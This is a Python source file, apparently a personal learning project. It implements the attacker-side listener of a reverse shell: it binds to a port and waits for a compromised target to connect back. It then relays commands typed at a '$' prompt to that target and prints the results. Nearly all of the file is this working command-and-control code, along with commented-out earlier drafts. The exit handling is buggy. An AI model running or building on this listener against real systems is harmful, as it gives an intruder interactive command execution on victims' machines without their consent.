''' This program listens on a port on this machine (Attacker) and waits for the client to connect back. Once the connection comes in. The shell initiates '''
import socket
import sys

''' Locally bind a socket to port so it can receive data '''
def handle_sock(port):
    #s = socket.socket()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    serv_host = '0.0.0.0'
    try:
        s.bind((serv_host, port))
        print("Binding is done")
    except socket.error as msg:
        sys.exit("Error: {}\nBind failed. You pagan...".format(msg))
    
    #s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    listen_conns = s.listen(1)
    print("Socket is listening... on port {}".format(port))
    conn, addr = s.accept()
    print("Connected to target: {}".format(addr[0]))
    #test = "Get this??".encode()
    test = "test".encode()
    conn.send(test)
    while True:
        # This opens the socket up for taking in connections
        # conn is the actual socket, addr is used for addressing purposes
        #conn, addr = s.accept()
        # Command handler 
        command = input("$ ")
        # Sending input over the wire which means string values are a no-no
        conn.send(command.encode())
        if command.lower() == "exit":
            conn.close()
            s.close()
        # Add the cd functionality
        # Receive command results here:
        result = conn.recv(1024).decode()
        # Decodes the end result of command and then returns what we need to see
        print(result)


    # We close the entire established connection and the socket file descriptor which opened i
    #conn.close()
    #s.close()
def main():
    try:
        port = int(sys.argv[1])
        handle_sock(port)
    except KeyboardInterrupt:
        sys.exit("\nExiting...")

    #client_socket, client_address = s.accept()
    
    #print("{}: connected", client_address[1])

    #message = "Hello and welcome".encode()
    #client_socket.send(message)
    #while True:
    	# get the command from prompt
    #	command = input("Enter the command you wanna execute:")
    	# send the command to the client
    #	client_socket.send(command.encode())
    #	if command.lower() == "exit":
        	# if the command is exit, just break out of the loop
    #    	break
    	# retrieve command results
    #	results = client_socket.recv(1024).decode()
    	# print them
    #	print(results)
    # close connection to the client
    #client_socket.close()
    #s.close()
main()
